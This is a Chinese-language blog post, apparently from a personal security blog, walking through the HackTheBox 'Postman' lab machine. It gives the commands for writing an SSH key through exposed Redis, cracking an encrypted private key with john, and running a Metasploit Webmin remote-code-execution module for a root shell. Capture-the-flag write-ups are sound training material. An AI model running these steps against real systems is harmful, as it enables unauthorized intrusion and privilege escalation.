@@ -1,0 +1,651 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+<meta name="theme-color" content="#222">
+<meta name="generator" content="Hexo 4.2.0">
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">
+  <link rel="stylesheet" href="//cdn.jsdelivr.net/gh/fancyapps/fancybox@3/dist/jquery.fancybox.min.css">
+  <link rel="stylesheet" href="/lib/pace/pace-theme-corner-indicator.min.css">
+  <script src="/lib/pace/pace.min.js"></script>
+
+<script id="hexo-configurations">
+    var NexT = window.NexT || {};
+    var CONFIG = {"hostname":"yoursite.com","root":"/","scheme":"Muse","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":false,"show_result":false,"style":null},"back2top":{"enable":true,"sidebar":false,"scrollpercent":true},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":true,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":true,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},"path":"search.xml"};
+  </script>
+
+  <meta name="description" content="1hackthebox第一台机子，边做边记录，充了vip，跟着youtube的大神IppSec视频来做，纯英文听起来有点困难（实操时nmap扫描需要等待，为看起来方便结果都会放在对应命令下面）">
+<meta property="og:type" content="article">
+<meta property="og:title" content="postman-hackthebox">
+<meta property="og:url" content="http://yoursite.com/2021/01/31/postman-hackthebox/index.html">
+<meta property="og:site_name" content="be a J0K1R">
+<meta property="og:description" content="1hackthebox第一台机子，边做边记录，充了vip，跟着youtube的大神IppSec视频来做，纯英文听起来有点困难（实操时nmap扫描需要等待，为看起来方便结果都会放在对应命令下面）">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="http://yoursite.com/2021/01/31/postman-hackthebox/20.png">
+<meta property="og:image" content="http://yoursite.com/2021/01/31/postman-hackthebox/1.png">
+<meta property="og:image" content="http://yoursite.com/2021/01/31/postman-hackthebox/7.png">
+<meta property="og:image" content="http://yoursite.com/2021/01/31/postman-hackthebox/2.png">
+<meta property="og:image" content="http://yoursite.com/2021/01/31/postman-hackthebox/3.png">
+<meta property="og:image" content="http://yoursite.com/2021/01/31/postman-hackthebox/6.png">
+<meta property="og:image" content="http://yoursite.com/2021/01/31/postman-hackthebox/4.png">
+<meta property="og:image" content="http://yoursite.com/2021/01/31/postman-hackthebox/5.png">
+<meta property="og:image" content="http://yoursite.com/2021/01/31/postman-hackthebox/8.png">
+<meta property="og:image" content="http://yoursite.com/2021/01/31/postman-hackthebox/9.png">
+<meta property="og:image" content="http://yoursite.com/2021/01/31/postman-hackthebox/10.png">
+<meta property="og:image" content="http://yoursite.com/2021/01/31/postman-hackthebox/11.png">
+<meta property="og:image" content="http://yoursite.com/2021/01/31/postman-hackthebox/13.png">
+<meta property="og:image" content="http://yoursite.com/2021/01/31/postman-hackthebox/12.png">
+<meta property="og:image" content="http://yoursite.com/2021/01/31/postman-hackthebox/14.png">
+<meta property="og:image" content="http://yoursite.com/2021/01/31/postman-hackthebox/15.png">
+<meta property="og:image" content="http://yoursite.com/2021/01/31/postman-hackthebox/17.png">
+<meta property="og:image" content="http://yoursite.com/2021/01/31/postman-hackthebox/16.png">
+<meta property="og:image" content="http://yoursite.com/2021/01/31/postman-hackthebox/18.png">
+<meta property="og:image" content="http://yoursite.com/2021/01/31/postman-hackthebox/19.png">
+<meta property="article:published_time" content="2021-01-31T08:00:36.000Z">
+<meta property="article:modified_time" content="2021-02-01T10:10:02.866Z">
+<meta property="article:author" content="Peguin">
+<meta property="article:tag" content="渗透">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="http://yoursite.com/2021/01/31/postman-hackthebox/20.png">
+
+<link rel="canonical" href="http://yoursite.com/2021/01/31/postman-hackthebox/">
+
+
+<script id="page-configurations">
+  // https://hexo.io/docs/variables.html
+  CONFIG.page = {
+    sidebar: "",
+    isHome : false,
+    isPost : true,
+    lang   : 'en'
+  };
+</script>
+
+  <title>postman-hackthebox | be a J0K1R</title>
+  
+
+
+
+
+
+
+  <noscript>
+  <style>
+  .use-motion .brand,
+  .use-motion .menu-item,
+  .sidebar-inner,
+  .use-motion .post-block,
+  .use-motion .pagination,
+  .use-motion .comments,
+  .use-motion .post-header,
+  .use-motion .post-body,
+  .use-motion .collection-header { opacity: initial; }
+
+  .use-motion .site-title,
+  .use-motion .site-subtitle {
+    opacity: initial;
+    top: initial;
+  }
+
+  .use-motion .logo-line-before i { left: initial; }
+  .use-motion .logo-line-after i { right: initial; }
+  </style>
+</noscript>
+
+<link rel="alternate" href="/atom.xml" title="be a J0K1R" type="application/atom+xml">
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage">
+  <div class="container use-motion">
+    <div class="headband"></div>
+
+    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="Toggle navigation bar">
+      <span class="toggle-line toggle-line-first"></span>
+      <span class="toggle-line toggle-line-middle"></span>
+      <span class="toggle-line toggle-line-last"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <span class="logo-line-before"><i></i></span>
+      <h1 class="site-title">be a J0K1R</h1>
+      <span class="logo-line-after"><i></i></span>
+    </a>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger">
+        <i class="fa fa-search fa-fw fa-lg"></i>
+    </div>
+  </div>
+</div>
+
+
+
+
+<nav class="site-nav">
+  <ul id="menu" class="main-menu menu">
+        <li class="menu-item menu-item-home">
+
+    <a href="/" rel="section"><i class="fa fa-home fa-fw"></i>Home</a>
+
+  </li>
+        <li class="menu-item menu-item-tags">
+
+    <a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>Tags</a>
+
+  </li>
+        <li class="menu-item menu-item-archives">
+
+    <a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>Archives</a>
+
+  </li>
+      <li class="menu-item menu-item-search">
+        <a role="button" class="popup-trigger"><i class="fa fa-search fa-fw"></i>Search
+        </a>
+      </li>
+  </ul>
+</nav>
+
+
+
+  <div class="search-pop-overlay">
+    <div class="popup search-popup">
+        <div class="search-header">
+  <span class="search-icon">
+    <i class="fa fa-search"></i>
+  </span>
+  <div class="search-input-container">
+    <input autocomplete="off" autocapitalize="off"
+           placeholder="Searching..." spellcheck="false"
+           type="search" class="search-input">
+  </div>
+  <span class="popup-btn-close">
+    <i class="fa fa-times-circle"></i>
+  </span>
+</div>
+<div id="search-result">
+  <div id="no-result">
+    <i class="fa fa-spinner fa-pulse fa-5x fa-fw"></i>
+  </div>
+</div>
+
+    </div>
+  </div>
+
+</div>
+    </header>
+
+    
+  <div class="back-to-top">
+    <i class="fa fa-arrow-up"></i>
+    <span>0%</span>
+  </div>
+  <div class="reading-progress-bar"></div>
+
+
+    <main class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          
+
+          <div class="content post posts-expand">
+            
+
+    
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2021/01/31/postman-hackthebox/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/1.jpg">
+      <meta itemprop="name" content="Peguin">
+      <meta itemprop="description" content="敢于去想，才会有MEteor的光芒闪耀。">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="be a J0K1R">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          postman-hackthebox
+        </h1>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">Posted on</span>
+
+              <time title="Created: 2021-01-31 16:00:36" itemprop="dateCreated datePublished" datetime="2021-01-31T16:00:36+08:00">2021-01-31</time>
+            </span>
+              <span class="post-meta-item">
+                <span class="post-meta-item-icon">
+                  <i class="far fa-calendar-check"></i>
+                </span>
+                <span class="post-meta-item-text">Edited on</span>
+                <time title="Modified: 2021-02-01 18:10:02" itemprop="dateModified" datetime="2021-02-01T18:10:02+08:00">2021-02-01</time>
+              </span>
+
+          
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+        <p>1hackthebox第一台机子，边做边记录，充了vip，跟着youtube的大神IppSec视频来做，纯英文听起来有点困难（实操时nmap扫描需要等待，为看起来方便结果都会放在对应命令下面）<a id="more"></a></p>
+<img src="/2021/01/31/postman-hackthebox/20.png" class="">
+
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">本机：10.10.14.16</span><br><span class="line">靶机：10.10.10.160</span><br></pre></td></tr></table></figure>
+
+<h3 id="nmap信息收集"><a href="#nmap信息收集" class="headerlink" title="nmap信息收集"></a>nmap信息收集</h3><p>探测端口</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -v -sC -sV -oA nmap/postman 10.10.10.160</span><br></pre></td></tr></table></figure>
+
+<img src="/2021/01/31/postman-hackthebox/1.png" class="">
+
+<p>爆破端口</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -p- -oA nmap/postman-allports 10.10.10.160</span><br></pre></td></tr></table></figure>
+
+<img src="/2021/01/31/postman-hackthebox/7.png" class="">
+
+<p>可以看到有个<code>6379</code>，redis服务</p>
+<p>接着访问一下靶机地址</p>
+<img src="/2021/01/31/postman-hackthebox/2.png" class="">
+
+<p>没有什么有用的信息，记一下邮箱地址<code>Postman@htb</code>,burp抓个包</p>
+<img src="/2021/01/31/postman-hackthebox/3.png" class="">
+
+<p>加载的都是一些静态文件，没有什么东西，<code>gobuster</code>尝试目录爆破</p>
+<h3 id="gobuster爆破目录"><a href="#gobuster爆破目录" class="headerlink" title="gobuster爆破目录"></a>gobuster爆破目录</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gobuster dir -u http://10.10.10.160 -w /usr/share/wordlists/dirbuster/directory-list-2-3-medium.txt -o gobuster-root.log</span><br></pre></td></tr></table></figure>
+
+<img src="/2021/01/31/postman-hackthebox/6.png" class="">
+
+<p>等待的时候回过头来看<code>less nmap/postman.nmap</code></p>
+<p>可以看到有一个10000端口，有个<code>MiniServ</code>,用<code>searchsploit</code>查找一下</p>
+<img src="/2021/01/31/postman-hackthebox/4.png" class="">
+
+<p>没有东西，尝试访问<code>10.10.10.160:10000,</code>网站带SSL，用的是https协议，<code>vi /etc/hosts</code>,加上</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">10.10.10.160 postman</span><br></pre></td></tr></table></figure>
+
+<p>再次尝试访问</p>
+<img src="/2021/01/31/postman-hackthebox/5.png" class="">
+
+<p>需要账号密码，暂时放一下，看一下<code>gobuster</code>目录爆破的结果，有一些静态文件的路径</p>
+<p>访问<code>10.10.10.160/upload</code>可以看到很多静态图片，<code>wget</code>下载<code>Cyber-security-web-banner.jpg</code>,用<code>exiftool</code>查看详细信息</p>
+<img src="/2021/01/31/postman-hackthebox/8.png" class="">
+
+<p>同样可以下载<code>10.10.10.160/index.html</code>来查看，步骤同上</p>
+<p>回过头来看redis</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc -v 10.10.10.160 6379</span><br></pre></td></tr></table></figure>
+
+<p><code>https://redis.io/commands/info</code>看一下可以看redis配置信息的命令，这里直接用<code>INFO</code></p>
+<img src="/2021/01/31/postman-hackthebox/9.png" class="">
+
+<h3 id="redis-ssh-crack"><a href="#redis-ssh-crack" class="headerlink" title="redis ssh crack"></a>redis ssh crack</h3><p>接着找一下<code>redis upload webshell</code>，<code>https://book.hacktricks.xyz/pentesting/6379-pentesting-redis</code>,文章里有各种攻击方法</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap --script redis-info -sV -p 6379 10.10.10.160</span><br></pre></td></tr></table></figure>
+
+<img src="/2021/01/31/postman-hackthebox/10.png" class="">
+
+<p>这台靶机主要是利用ssh，先生成ssh密钥</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ssh-keygen -f postman</span><br></pre></td></tr></table></figure>
+
+<p>之后就是按照文章给的来(这里google找到redis能够写入文件的路径)</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">cat postman.pub | redis-cli -h 10.10.10.160 -x set crackit </span><br><span class="line"></span><br><span class="line">config set dir /var/lib/redis/</span><br><span class="line">config set dbfilename "authorized_keys"</span><br><span class="line">save</span><br><span class="line"></span><br><span class="line">这里ssh之前记得更改密码文件的权限，chmod 600 xxx</span><br><span class="line"></span><br><span class="line">ssh -i postman redis@10.10.10.160</span><br></pre></td></tr></table></figure>
+
+<img src="/2021/01/31/postman-hackthebox/11.png" class="">
+
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">进去之后用linpeas脚本一键收集linux的所有信息（类似的还有LinEnum）</span><br></pre></td></tr></table></figure>
+
+<p>github拉取，用python起一个环境，redis服务器上wget获取脚本,内容很多就不贴图了，主要熟悉一下收集信息的手段</p>
+<p>下面的是最重要的信息，可以确定Matt修改了这个/opt/id_rsa文件</p>
+<img src="/2021/01/31/postman-hackthebox/13.png" class="">
+
+<img src="/2021/01/31/postman-hackthebox/12.png" class="">
+
+<img src="/2021/01/31/postman-hackthebox/14.png" class="">
+
+<h3 id="john-crack"><a href="#john-crack" class="headerlink" title="john crack"></a>john crack</h3><p>到这里基本就找到了最后的利用点，这个rsa进行了加密，要用<code>john</code>破解</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">python /usr/share/john/ssh2john.py postman.ssh &gt; postman-join.ssh</span><br><span class="line">john postman-join.ssh --wordlist=/usr/share/wordlists/rockyou.txt  </span><br><span class="line"></span><br><span class="line">Matt:computer2008</span><br></pre></td></tr></table></figure>
+
+<img src="/2021/01/31/postman-hackthebox/15.png" class="">
+
+<h3 id="user-flag"><a href="#user-flag" class="headerlink" title="user flag"></a>user flag</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">su Matt可以切换用户，不能用私钥直接登录，原因如下图</span><br></pre></td></tr></table></figure>
+
+<img src="/2021/01/31/postman-hackthebox/17.png" class="">
+
+<p>读取user flag</p>
+<img src="/2021/01/31/postman-hackthebox/16.png" class="">
+
+
+
+<p>回到之前<code>10000</code>端口的 登录界面，用上面的账号登录</p>
+<h3 id="exploit"><a href="#exploit" class="headerlink" title="exploit"></a>exploit</h3><p>1.910版本的Webmin，存在已知的漏洞。msf模块中有，需要设置ssl为true</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">searchsploit Webmin 1.910</span><br><span class="line"></span><br><span class="line">msfdb run</span><br><span class="line">search webmin</span><br><span class="line">use exploit/linux/http/webmin_packageup_rce</span><br><span class="line">set RHOSTS 10.10.10.160</span><br><span class="line">set LHOST tun0</span><br><span class="line">set USERNAME Matt</span><br><span class="line">set PASSWORD computer2008</span><br><span class="line">set SSL true(一定要设置为true)</span><br><span class="line">run</span><br></pre></td></tr></table></figure>
+
+<img src="/2021/01/31/postman-hackthebox/18.png" class="">
+
+<p>弹回的就是root权限的shell</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat &#x2F;root&#x2F;root.txt</span><br></pre></td></tr></table></figure>
+
+<img src="/2021/01/31/postman-hackthebox/19.png" class="">
+
+<h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><p>第一台靶机到这里就结束了，怼了将近4个多小时，从头到尾跟着youtube大神过了一遍思路，还有一种不用msfconsole来反弹shell 的方式，之后再记一下</p>
+
+    </div>
+
+    
+    
+    
+        <div class="reward-container">
+  <div></div>
+  <button onclick="var qr = document.getElementById('qr'); qr.style.display = (qr.style.display === 'none') ? 'block' : 'none';">
+    Donate
+  </button>
+  <div id="qr" style="display: none;">
+      
+      <div style="display: inline-block;">
+        <img src="/images/wechatpay.jpg" alt="Peguin WeChat Pay">
+        <p>WeChat Pay</p>
+      </div>
+      
+      <div style="display: inline-block;">
+        <img src="/images/alipay.jpg" alt="Peguin Alipay">
+        <p>Alipay</p>
+      </div>
+
+  </div>
+</div>
+
+        
+
+<div>
+<ul class="post-copyright">
+  <li class="post-copyright-author">
+    <strong>Post author:  </strong>Peguin
+  </li>
+  <li class="post-copyright-link">
+    <strong>Post link: </strong>
+    <a href="http://yoursite.com/2021/01/31/postman-hackthebox/" title="postman-hackthebox">http://yoursite.com/2021/01/31/postman-hackthebox/</a>
+  </li>
+  <li class="post-copyright-license">
+    <strong>Copyright Notice:  </strong>All articles in this blog are licensed under <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" rel="noopener" target="_blank"><i class="fab fa-fw fa-creative-commons"></i>BY-NC-SA</a> unless stating additionally.
+  </li>
+</ul>
+</div>
+
+        
+
+  <div class="followme">
+    <p>Welcome to my other publishing channels</p>
+
+    <div class="social-list">
+
+        <div class="social-item">
+          <a target="_blank" class="social-link" href="/images/2.jpg">
+            <span class="icon">
+              <i class="fab fa-weixin"></i>
+            </span>
+
+            <span class="label">WeChat</span>
+          </a>
+        </div>
+
+        <div class="social-item">
+          <a target="_blank" class="social-link" href="/atom.xml">
+            <span class="icon">
+              <i class="fa fa-rss"></i>
+            </span>
+
+            <span class="label">RSS</span>
+          </a>
+        </div>
+    </div>
+  </div>
+
+
+      <footer class="post-footer">
+          <div class="post-tags">
+              <a href="/tags/%E6%B8%97%E9%80%8F/" rel="tag"># 渗透</a>
+          </div>
+
+        
+
+
+        
+    <div class="post-nav">
+      <div class="post-nav-item">
+    <a href="/2021/01/29/Weblogic-SSRF-CVE-2014-4210/" rel="prev" title="Weblogic-SSRF-CVE-2014-4210">
+      <i class="fa fa-chevron-left"></i> Weblogic-SSRF-CVE-2014-4210
+    </a></div>
+      <div class="post-nav-item">
+    <a href="/2021/02/01/ai-hackthebox/" rel="next" title="ai-hackthebox">
+      ai-hackthebox <i class="fa fa-chevron-right"></i>
+    </a></div>
+    </div>
+      </footer>
+    
+  </article>
+  <div>
+  
+    <div>
+    
+        <div style="text-align:center;color: #ccc;font-size:14px;">-------------本文结束<i class="fa fa-paw"></i>感谢您的阅读-------------</div>
+    
+</div>
+  
+</div>
+  
+  
+  
+
+
+
+          </div>
+          
+
+<script>
+  window.addEventListener('tabs:register', () => {
+    let { activeClass } = CONFIG.comments;
+    if (CONFIG.comments.storage) {
+      activeClass = localStorage.getItem('comments_active') || activeClass;
+    }
+    if (activeClass) {
+      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
+      if (activeTab) {
+        activeTab.click();
+      }
+    }
+  });
+  if (CONFIG.comments.storage) {
+    window.addEventListener('tabs:click', event => {
+      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
+      let commentClass = event.target.classList[1];
+      localStorage.setItem('comments_active', commentClass);
+    });
+  }
+</script>
+
+        </div>
+          
+  
+  <div class="toggle sidebar-toggle">
+    <span class="toggle-line toggle-line-first"></span>
+    <span class="toggle-line toggle-line-middle"></span>
+    <span class="toggle-line toggle-line-last"></span>
+  </div>
+
+  <aside class="sidebar">
+    <div class="sidebar-inner">
+
+      <ul class="sidebar-nav motion-element">
+        <li class="sidebar-nav-toc">
+          Table of Contents
+        </li>
+        <li class="sidebar-nav-overview">
+          Overview
+        </li>
+      </ul>
+
+      <!--noindex-->
+      <div class="post-toc-wrap sidebar-panel">
+          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-3"><a class="nav-link" href="#nmap信息收集"><span class="nav-number">1.</span> <span class="nav-text">nmap信息收集</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#gobuster爆破目录"><span class="nav-number">2.</span> <span class="nav-text">gobuster爆破目录</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#redis-ssh-crack"><span class="nav-number">3.</span> <span class="nav-text">redis ssh crack</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#john-crack"><span class="nav-number">4.</span> <span class="nav-text">john crack</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#user-flag"><span class="nav-number">5.</span> <span class="nav-text">user flag</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#exploit"><span class="nav-number">6.</span> <span class="nav-text">exploit</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#总结"><span class="nav-number">7.</span> <span class="nav-text">总结</span></a></li></ol></div>
+      </div>
+      <!--/noindex-->
+
+      <div class="site-overview-wrap sidebar-panel">
+        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+    <img class="site-author-image" itemprop="image" alt="Peguin"
+      src="/images/1.jpg">
+  <p class="site-author-name" itemprop="name">Peguin</p>
+  <div class="site-description" itemprop="description">敢于去想，才会有MEteor的光芒闪耀。</div>
+</div>
+<div class="site-state-wrap motion-element">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+          <a href="/archives/">
+        
+          <span class="site-state-item-count">87</span>
+          <span class="site-state-item-name">posts</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-tags">
+            <a href="/tags/">
+          
+        <span class="site-state-item-count">40</span>
+        <span class="site-state-item-name">tags</span></a>
+      </div>
+  </nav>
+</div>
+  <div class="links-of-author motion-element">
+      <span class="links-of-author-item">
+        <a href="https://github.com/ambitiousleader/" title="GitHub → https:&#x2F;&#x2F;github.com&#x2F;ambitiousleader&#x2F;" rel="noopener" target="_blank"><i class="fab fa-github fa-fw"></i>GitHub</a>
+      </span>
+      <span class="links-of-author-item">
+        <a href="/601209387@qq.com" title="E-Mail → 601209387@qq.com"><i class="fa fa-envelope fa-fw"></i>E-Mail</a>
+      </span>
+      <span class="links-of-author-item">
+        <a href="https://weibo.com/u/6772435317/home?wvr=5&sudaref=graph.qq.com" title="Weibo → https:&#x2F;&#x2F;weibo.com&#x2F;u&#x2F;6772435317&#x2F;home?wvr&#x3D;5&amp;sudaref&#x3D;graph.qq.com" rel="noopener" target="_blank"><i class="fab fa-weibo fa-fw"></i>Weibo</a>
+      </span>
+  </div>
+
+
+
+      </div>
+
+    </div>
+  </aside>
+  <div id="sidebar-dimmer"></div>
+
+
+      </div>
+    </main>
+
+    <footer class="footer">
+      <div class="footer-inner">
+        
+
+        
+
+<div class="copyright">
+  
+  &copy; 
+  <span itemprop="copyrightYear">2021</span>
+  <span class="with-love">
+    <i class="fa fa-heart"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">Peguin</span>
+</div>
+  <div class="powered-by">Powered by <a href="https://hexo.io/" class="theme-link" rel="noopener" target="_blank">Hexo</a> & <a href="https://muse.theme-next.org/" class="theme-link" rel="noopener" target="_blank">NexT.Muse</a>
+  </div>
+
+        
+
+
+
+
+
+
+
+
+      </div>
+    </footer>
+  </div>
+
+  
+  
+  <script color='0,0,0' opacity='0.5' zIndex='-1' count='150' src="/lib/canvas-nest/canvas-nest.min.js"></script>
+  <script src="/lib/anime.min.js"></script>
+  <script src="//cdn.jsdelivr.net/npm/jquery@3/dist/jquery.min.js"></script>
+  <script src="//cdn.jsdelivr.net/gh/fancyapps/fancybox@3/dist/jquery.fancybox.min.js"></script>
+  <script src="/lib/velocity/velocity.min.js"></script>
+  <script src="/lib/velocity/velocity.ui.min.js"></script>
+
+<script src="/js/utils.js"></script>
+
+<script src="/js/motion.js"></script>
+
+
+<script src="/js/schemes/muse.js"></script>
+
+
+<script src="/js/next-boot.js"></script>
+
+
+  <script defer src="/lib/three/three.min.js"></script>
+
+
+  
+
+
+
+
+  
+<script src="/js/local-search.js"></script>
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+  
+
+
+  
+   <canvas class="fireworks" style="position: fixed;left: 0;top: 0;z-index: 1; pointer-events: none;" ></canvas> 
+   <script type="text/javascript" src="//cdn.bootcss.com/animejs/2.2.0/anime.min.js"></script> 
+   <script type="text/javascript" src="/js/fireworks.js"></script>
+  
+
+
+</body>
+</html>
